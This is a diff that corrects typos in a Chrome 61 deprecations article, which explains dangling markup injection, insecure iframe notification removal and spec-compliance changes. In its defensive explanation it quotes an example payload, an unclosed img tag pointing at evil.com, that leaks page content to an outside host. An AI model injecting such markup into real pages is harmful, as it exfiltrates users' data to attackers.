@@ -2,7 +2,7 @@ project_path: /web/_project.yaml
 book_path: /web/updates/_book.yaml
 description: A round up of the deprecations and removals in Chrome 61 to help you plan. In this version, security improvements, further webkit deprecations, and more.
 
-{# wf_updated_on: 2017-08-03 #}
+{# wf_updated_on: 2017-08-04 #}
 {# wf_published_on: 2017-08-03 #}
 {# wf_tags: deprecations,removals,chrome61 #}
 {# wf_featured_image: /web/updates/images/generic/warning.png #}
@@ -23,11 +23,11 @@ which is in beta as of June 8. This list is subject to change at any time.
 
 There is a type of hacking called *dangling markup injection* in which a
 truncated URL is used to send data to an external endpoint. For example,
-consider a page containing `<img src='https://evil.com/?`. Becaue the URL has no
+consider a page containing `<img src='https://evil.com/?`. Because the URL has no
 closing quote, browsers will read to the next quote that occurs and treat the
 enclosed characters as if it were a single URL.
 
-Chrome 61 mitigateas this vulnerability by restricting the character sets
+Chrome 61 mitigates this vulnerability by restricting the character sets
 allowed in `href` and `src` attributes. Specifically, Chrome will stop
 processing URLs when it encounters new line characters (`\n`) and less than
 characters (`<`).
@@ -41,7 +41,7 @@ URL should instead escape these characters.
 
 ## Remove usage of notifications from insecure iframes
 
-Perfmission requests from iframes can confuse users since it is difficult to
+Permission requests from iframes can confuse users since it is difficult to
 distinguish between the containing page's origin and the origin of the iframe
 that is making the request. When the requests scope is unclear, it is difficult
 for users to judge whether to grant or deny permission.
@@ -114,7 +114,7 @@ Previously some browsers allowed for JavaScript assignments like the following:
 The [current HTML spec 
 notes](https://html.spec.whatwg.org/multipage/window-object.html#windowproxy-defineownproperty)
 that this is an explicit violation of
-the JavaScript sepc. As such, this ability is removed in Chrome 61. As of
+the JavaScript spec. As such, this ability is removed in Chrome 61. As of
 February 2016, Firefox is already in compliance.
 
 [Chromium Bug](https://bugs.chromium.org/p/chromium/issues/detail?id=695385)
